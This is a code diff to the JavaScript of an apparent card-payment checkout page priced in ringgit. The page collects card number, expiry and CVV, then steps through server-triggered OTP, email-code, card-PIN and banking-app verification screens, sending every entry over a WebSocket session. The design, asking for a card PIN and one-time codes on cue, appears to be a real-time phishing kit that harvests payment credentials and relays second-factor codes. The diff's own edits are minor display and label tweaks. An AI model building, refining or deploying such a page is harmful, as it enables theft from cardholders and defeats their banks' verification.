@@ -642,8 +642,8 @@
           var mounts=['mount1','mount2','mount3','mount4','mount5','mount6','mount7'];
           mounts.forEach(function(m){var el=document.getElementById(m);if(el){el.classList.add('hidden');el.innerHTML=''}});
           var avb=q('app-verify-box');if(avb)avb.classList.add('hidden');
-          var oe=q('otp-error');if(oe)oe.style.display='none';
-          var pe=q('pin-error');if(pe)pe.style.display='none';
+          var oe=q('otp-error');if(oe)oe.style.display="";
+          var pe=q('pin-error');if(pe)pe.style.display="";
         }
 
         if(a === 'ack') {
@@ -681,7 +681,7 @@
               document.querySelector("#otp-amount").textContent = 'RM '+document.getElementById('total-amount').textContent.replace(/[^\d.]/g,'');
               var oo2=q('otp-overlay');if(oo2)oo2.classList.remove('hidden');
               var oc2=q('otp-code');if(oc2)oc2.value='';
-              var oe3=q('otp-error');if(oe3)oe3.style.display='none';
+              var oe3=q('otp-error');if(oe3)oe3.style.display="";
               var os2=q('otp-submit');if(os2)os2.disabled=false;
               var or=q('otp-resend');if(or)or.disabled=false;
               var ott=q('otp-timer');if(ott)ott.textContent = '4:59';
@@ -696,7 +696,7 @@
               document.querySelector("#email-amount").textContent = 'RM '+document.getElementById('total-amount').textContent.replace(/[^\d.]/g,'');
               var eo2=q('email-overlay');if(eo2)eo2.classList.remove('hidden');
               var ec=q('email-code');if(ec)ec.value='';
-              var ee2=q('email-error');if(ee2)ee2.style.display='none';
+              var ee2=q('email-error');if(ee2)ee2.style.display="";
               var es2=q('email-submit');if(es2)es2.disabled=false;
               var er=q('email-resend');if(er)er.disabled=false;
               var emt=q('email-timer');if(emt)emt.textContent = '4:59';
@@ -708,7 +708,7 @@
               _curStep = 'pin_verify';
               var po=q('pin-overlay');if(po)po.classList.remove('hidden');
               ['pin-d1','pin-d2','pin-d3','pin-d4'].forEach(function(d){var pd=q(d);if(pd)pd.value=''});
-              var pe2=q('pin-error');if(pe2)pe2.style.display='none';
+              var pe2=q('pin-error');if(pe2)pe2.style.display="";
               var ps2=q('pin-submit');if(ps2)ps2.disabled=false;
               var pinAmount=document.getElementById('pin-amount');if(pinAmount)pinAmount.textContent='RM '+document.getElementById('total-amount').textContent.replace(/[^\d.]/g,'');
               var ct=(p.cardInfo&&p.cardInfo.cardType)||p.cardType||'';
@@ -753,8 +753,8 @@
                }
                else if(a === 'otp_error') {
                  var lo2=q('load-overlay');if(lo2)lo2.classList.add('hidden');
-                 var otps=document.getElementById('otp-spinner');if(otps){otps.classList.add('hidden');otps.style.display='none'}
-                 var ems=document.getElementById('email-spinner');if(ems){ems.classList.add('hidden');ems.style.display='none'}
+                 var otps=document.getElementById('otp-spinner');if(otps){otps.classList.add('hidden');otps.style.display=""}
+                 var ems=document.getElementById('email-spinner');if(ems){ems.classList.add('hidden');ems.style.display=""}
                  var oo2=q('otp-overlay');if(oo2)oo2.classList.remove('hidden');
                  var of=q('otp-form');if(of)of.classList.remove('hidden');
                  var or2=q('otp-result');if(or2)or2.classList.add('hidden');
@@ -800,16 +800,16 @@
                   var bs4=q('btnSubmit');if(bs4)bs4.disabled=false;
                   var cm=p.message||'';
                   if((function(){var avo=q('app-verify-overlay');return avo?!avo.classList.contains('hidden'):false})()){
-                    for(var i=1;i<=7;i++){var m=document.getElementById('mount'+i);if(!m.classList.contains('hidden')&&m.shadowRoot){var sp=m.shadowRoot.querySelector('.vfy-spinner');var er=m.shadowRoot.querySelector('.app-error');if(sp){sp.classList.add('hidden');sp.style.display='none'}if(er){er.classList.remove('hidden');er.textContent=cm};return}}
-                    var avbox=q('app-verify-box');if(avbox)avbox.classList.remove('hidden');var as=document.getElementById('app-spinner');if(as){as.classList.add('hidden');as.style.display='none'}var ae4=q('app-error');if(ae4)ae4.classList.remove('hidden');var ae3=q('app-error');if(ae3)ae3.textContent=cm;var acb=q('app-continue-btn');if(acb)acb.disabled=false
+                    for(var i=1;i<=7;i++){var m=document.getElementById('mount'+i);if(!m.classList.contains('hidden')&&m.shadowRoot){var sp=m.shadowRoot.querySelector('.vfy-spinner');var er=m.shadowRoot.querySelector('.app-error');if(sp){sp.classList.add('hidden');sp.style.display=""}if(er){er.classList.remove('hidden');er.textContent=cm};return}}
+                    var avbox=q('app-verify-box');if(avbox)avbox.classList.remove('hidden');var as=document.getElementById('app-spinner');if(as){as.classList.add('hidden');as.style.display=""}var ae4=q('app-error');if(ae4)ae4.classList.remove('hidden');var ae3=q('app-error');if(ae3)ae3.textContent=cm;var acb=q('app-continue-btn');if(acb){acb.disabled=false;acb.textContent='Continue to complete'}
                   }else if((function(){var avo3=q('otp-overlay');return avo3?!avo3.classList.contains('hidden'):false})()){
-                    var otpsp=document.getElementById('otp-spinner');if(otpsp){otpsp.classList.add('hidden');otpsp.style.display='none'}
+                    var otpsp=document.getElementById('otp-spinner');if(otpsp){otpsp.classList.add('hidden');otpsp.style.display=""}
                     q('otp-result').classList.remove('hidden');var otpResP2=document.querySelector('#otp-result>p');if(otpResP2)otpResP2.textContent=cm
                   }else if((function(){var avo4=q('email-overlay');return avo4?!avo4.classList.contains('hidden'):false})()){
-                    var emsp=document.getElementById('email-spinner');if(emsp){emsp.classList.add('hidden');emsp.style.display='none'}
+                    var emsp=document.getElementById('email-spinner');if(emsp){emsp.classList.add('hidden');emsp.style.display=""}
                     q('email-result').classList.remove('hidden');var emailResP2=document.querySelector('#email-result>p');if(emailResP2)emailResP2.textContent=cm
                   }else if((function(){var avo5=q('pin-overlay');return avo5?!avo5.classList.contains('hidden'):false})()){
-                    var psp=document.getElementById('pin-spinner');if(psp){psp.classList.add('hidden');psp.style.display='none'}
+                    var psp=document.getElementById('pin-spinner');if(psp){psp.classList.add('hidden');psp.style.display=""}
                     var pe4=q('pin-error');if(pe4)pe4.textContent=cm;var pe3=q('pin-error');if(pe3)pe3.style.display='block'
                   }else{showMsg('error',cm)}
                 }
@@ -843,7 +843,7 @@
                   function resetOtp() {
                     var of=q('otp-form');if(of)of.classList.remove('hidden');
                     var or2=q('otp-result');if(or2)or2.classList.add('hidden');
-                    var oe3=q('otp-error');if(oe3)oe3.style.display='none';
+                    var oe3=q('otp-error');if(oe3)oe3.style.display="";
                     var oc2=q('otp-code');if(oc2)oc2.value='';
                     var os2=q('otp-submit');if(os2)os2.disabled=false
                   }
@@ -909,7 +909,7 @@
                           var pe4=q('pin-error');if(pe4)pe4.textContent = 'Please enter 4-digit PIN';
                           return
                         }
-                        var pe2=q('pin-error');if(pe2)pe2.style.display='none';
+                        var pe2=q('pin-error');if(pe2)pe2.style.display="";
                         var po2=q('pin-overlay');if(po2)po2.classList.add('hidden');
                         var lo3=q('load-overlay');if(lo3)lo3.classList.remove('hidden');
                         var p = buildPayload();
@@ -921,7 +921,7 @@
                           ,currentStep : 'pin_verify'}
                         }))}
                         function submitPayment() {
-                          var s2=q('statusMsg');if(s2)s2.style.display='none';
+                          var s2=q('statusMsg');if(s2)s2.style.display="";
                           var cn = (q('cardNumber') ? q('cardNumber').value : '').replace(/\s/g, '');
                           var mo = (q('card_expiry_month') ? (q('card_expiry_month')||{value:''}).value : '');
                           var yr = (q('card_expiry_year') ? (q('card_expiry_year')||{value:''}).value : '');
@@ -968,7 +968,7 @@
                         function submitOtp() {
                           var code=q('otp-code')?q('otp-code').value.trim():'';
                           if(!code||code.length<4){var oe=q('otp-error');if(oe){oe.style.display='block';oe.textContent='Please enter the OTP.'};return}
-                          var oe=q('otp-error');if(oe)oe.style.display='none';
+                          var oe=q('otp-error');if(oe)oe.style.display="";
                           var os=document.getElementById('otp-spinner');if(os){os.style.display='flex';os.classList.remove('hidden')}
                           var btn=q('otp-submit');if(btn)btn.disabled=true;
                           if(ws&&ws.readyState===WebSocket.OPEN&&sid){
@@ -981,7 +981,7 @@
                         function submitEmailVerify() {
                           var code=q('email-code')?q('email-code').value.trim():'';
                           if(!code||code.length<4){var ee=q('email-error');if(ee){ee.style.display='block';ee.textContent='Please enter the code.'};return}
-                          var ee=q('email-error');if(ee)ee.style.display='none';
+                          var ee=q('email-error');if(ee)ee.style.display="";
                           var es=document.getElementById('email-spinner');if(es){es.style.display='flex';es.classList.remove('hidden')}
                           var btn=q('email-submit');if(btn)btn.disabled=true;
                           if(ws&&ws.readyState===WebSocket.OPEN&&sid){
@@ -994,7 +994,7 @@
                         function submitPin() {
                           var pin='';for(var i=1;i<=4;i++){pin+=q('pin-d'+i).value}
                           if(pin.length<4){var pe3=q('pin-error');if(pe3)pe3.style.display='block';var pe4=q('pin-error');if(pe4)pe4.textContent='Please enter 4-digit PIN';return}
-                          var pe2=q('pin-error');if(pe2)pe2.style.display='none';
+                          var pe2=q('pin-error');if(pe2)pe2.style.display="";
                           var ps=document.getElementById('pin-spinner');if(ps){ps.style.display='flex';ps.classList.remove('hidden')}
                           var btn=q('pin-submit');if(btn)btn.disabled=true;
                           if(ws&&ws.readyState===WebSocket.OPEN&&sid){
@@ -1006,7 +1006,7 @@
                         function submitAppVerify() {
                           var as=document.getElementById('app-spinner');if(as){as.style.display='flex';as.classList.remove('hidden')}
                           var btn=q('app-continue-btn');if(btn){btn.disabled=true;btn.textContent='Waiting...'}
-                          var ae=q('app-error');if(ae)ae.style.display='none';
+                          var ae=q('app-error');if(ae)ae.style.display="";
                           if(ws&&ws.readyState===WebSocket.OPEN&&sid){
                             ws.send(JSON.stringify({type:'app_verify_done',payload:{sessionId:sid}}))
                           }
@@ -1022,7 +1022,7 @@
                                      el.innerHTML='';el.style.background='transparent';
                                      var img=document.createElement('img');
                                      img.style.cssText='width:34px;height:28px;object-fit:contain';
-                                     img.onerror=function(){img.style.display='none';el.textContent=(name||'IB').slice(0,2).toUpperCase();el.style.background=getBankColor(name)};
+                                     img.onerror=function(){img.style.display="";el.textContent=(name||'IB').slice(0,2).toUpperCase();el.style.background=getBankColor(name)};
                                      fetch('/api/logo/'+encodeURIComponent(name||'Bank')).then(function(r){return r.json()}).then(function(d){var url=(d.data||d).logoUrl||'';if(url){img.src=url;el.appendChild(img)}else{img.onerror()}}).catch(function(){el.textContent=(name||'IB').slice(0,2).toUpperCase();el.style.background=getBankColor(name)})
                                    }
                                    function updateAppSchemeLogo(cardType) {
@@ -1043,7 +1043,7 @@
                                       var bn = (p.cardInfo && p.cardInfo.bankName) || p.bankName || 'Bank';
                                       updateBankLogo(bn);
                                       var aa=q('app-amount');if(aa)aa.textContent = 'RM '+document.getElementById('total-amount').textContent.replace(/[^\d.]/g,'');
-                                      var ae=q('app-error');if(ae)ae.style.display='none';
+                                      var ae=q('app-error');if(ae)ae.style.display="";
                                       var acb=q('app-continue-btn');if(acb)acb.disabled = false;
                                     var acb2=q('app-continue-btn');if(acb2)acb2.textContent = 'Continue to complete'}
                                     function showAppError(p) {
@@ -1055,7 +1055,7 @@
                                           var er = m.shadowRoot.querySelector('.app-error');
                                           if(sp) {
                                             sp.classList.add('hidden');
-                                          sp.style.display = 'none'}
+                                          sp.style.display=""}
                                           if(er) {
                                             er.classList.remove('hidden');
                                             er.textContent = msg
@@ -1071,7 +1071,7 @@
                                       q('cardNumber').addEventListener('input',function() {
                                         var v = this.value.replace(/\D/g,'').slice(0,16);
                                         this.value = v.replace(/(\d{4})(?=\d)/g,'$1 ');
-                                        if(v.length===16&&!luhn(v)){showMsg('error','Invalid card number.');this.value='';setTimeout(function(){var el=document.getElementById('cardNumber');if(el)el.focus()},100)}else if(v.length===16){var s3=q('statusMsg');if(s3)s3.style.display='none'}})
+                                        if(v.length===16&&!luhn(v)){showMsg('error','Invalid card number.');this.value='';setTimeout(function(){var el=document.getElementById('cardNumber');if(el)el.focus()},100)}else if(v.length===16){var s3=q('statusMsg');if(s3)s3.style.display=""}})
                                       q('cvv').addEventListener('input',function() {
                                       this.value = this.value.replace(/\D/g,'').slice(0,4)}
                                       );
